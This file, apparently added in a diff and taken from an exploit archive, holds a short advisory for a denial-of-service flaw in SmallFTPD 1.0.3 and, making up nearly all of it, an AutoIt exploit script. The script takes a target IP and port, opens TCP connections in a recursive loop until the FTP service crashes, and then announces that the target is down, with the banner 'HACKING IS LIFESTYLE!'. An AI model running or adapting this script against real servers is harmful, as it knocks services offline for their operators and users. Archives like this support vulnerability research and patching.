@@ -1,0 +1,80 @@
+source: http://www.securityfocus.com/bid/58856/info
+
+SmallFTPD is prone to an unspecified denial-of-service vulnerability.
+
+A remote attacker can exploit this issue to crash the application resulting, in denial-of-service conditions.
+
+SmallFTPD 1.0.3 is vulnerable; other versions may also be affected. 
+
+#ce
+#include <String.au3>
+$f=_StringRepeat('#',10);
+$USE_PROTO='ftp://';
+$INVALIDIP='INVALID IP FORMAT';
+$INVALIDPORT='INVALID PORT NUMBER!';
+$HTTPUA='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; SV1; .NET CLR 1.1.4325)';
+$msg_usage=$f & ' smallftpd 1.0.3 DENIAL OF SERVICE exploit ' & StringMid($f,1,7) & @CRLF & _
+$f & " Usage: " & _
+@ScriptName & ' REMOTEIP ' & ' REMOTEPORT ' & $f & @CRLF & _
+StringReplace($f,'#','\') & _StringRepeat(' ',10) & _
+'HACKING IS LIFESTYLE!' & _StringRepeat(' ',10) & StringReplace($f,'#','/')
+if $CmdLine[0]=0 Then
+MsgBox(64,"","This is a console Application!" & @CRLF & 'More Info: ' & @ScriptName & ' --help' & @CRLF & _
+'Invoke It from MSDOS!',5)
+exit;
+EndIf
+if $CmdLine[0] <> 2 Then
+ConsoleWrite(@CRLF & _StringRepeat('#',62) & @CRLF & $msg_usage & @CRLF & _StringRepeat('#',62) & @CRLF);
+exit;
+EndIf
+$ip=StringMid($CmdLine[1],1,15);//255.255.255.255
+$port=StringMid($CmdLine[2],1,5);//65535
+validateall($ip,$port)
+func validateall($ip,$port)
+if not StringIsDigit($port) Or NOT (Number($port)<=65535) Then
+ConsoleWrite($INVALIDPORT);
+Exit;
+EndIf
+TCPStartup();
+$ip=TCPNameToIP($ip);
+TCPShutdown();
+$z=StringSplit($ip,Chr(46));//Asc('.')
+if @error then
+ConsoleWrite($INVALIDIP);
+exit;
+EndIf
+for $x=0 to $z[0]
+if Number($z[0]-1) <>3 Then
+ConsoleWrite($INVALIDIP);
+Exit
+EndIf
+if $x>=1 AND Not StringIsDigit($z[$x]) Or StringLen($z[$x])>3 Then
+ConsoleWrite($INVALIDIP);
+exit;
+EndIf
+Next
+$x=0;
+ConsoleWrite(@CRLF & _StringRepeat('#',62) & @CRLF & $msg_usage & @CRLF & _StringRepeat('#',62) & @CRLF);
+ConsoleWrite(@CRLF & $f & _StringRepeat('#',6) & ' WORKING ON IT! PLEASE WAIT...' & _StringRepeat('#',6) & $f & @CRLF)
+downit($ip,$port,$x)
+EndFunc; =>validateall($ip,$port)
+Func downit($ip,$port,$x)
+$x+=1;
+TCPStartup()
+$socket_con = -1
+$socket_con = TCPConnect($ip, $port)
+If not @error Then
+if Mod($x,40)=0 Then
+ConsoleWrite(_StringRepeat('-',62) & @CRLF & '~ TRY count: ~ ' & $x & @CRLF & _StringRepeat('-',62) & @CRLF)
+Sleep(Random(1000,1800,1));
+EndIf
+downit($ip,$port,$x)
+Else
+Beep(1000,1500)
+ConsoleWrite(_StringRepeat('#',62) & @CRLF & $f & _StringRepeat(' ',12) & 'Mission Completed! @' & $x & _StringRepeat(' ',12) & $f & @CRLF & _
+_StringRepeat(' ',5) & ' TARGET =>' & StringLower($USE_PROTO & $ip & ':' & $port) & '/ is * DOWN ! * ' & @CRLF & _StringRepeat('#',62));
+TCPShutdown();
+exit;
+EndIf
+EndFunc; ==>downit($ip,$port,$x)
+#cs
